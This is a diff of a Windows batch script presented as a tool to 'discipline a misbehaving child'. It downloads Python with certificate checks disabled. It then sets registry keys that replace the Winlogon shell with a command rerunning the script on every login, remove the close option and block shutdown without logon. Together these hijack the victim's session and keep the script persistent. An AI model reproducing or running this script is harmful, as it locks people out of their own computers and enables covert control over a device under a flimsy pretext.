@@ -1,15 +1,15 @@
 @echo off
 pushd %~dp0%
+noclose
+if "%1"=="skid" goto init
 echo press any key if you agree that you are ONLY doing this to discipline a misbehaving child...
 pause > nul
-noclose
 if exist python314 goto python
 del python-3.14.7-embed-amd64.zip /q
 aria2c --check-certificate=false -x16 -m16 -s16 https://www.python.org/ftp/python/3.14.7/python-3.14.7-embed-amd64.zip
 7z x -aoa python-3.14.7-embed-amd64.zip -opython314
 del /q python-3.14.7-embed-amd64.zip
 :python
-if "%1"=="skid" goto init
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
 reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f /d "cmd /c cd /d %cd% && cum.cmd skid"
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
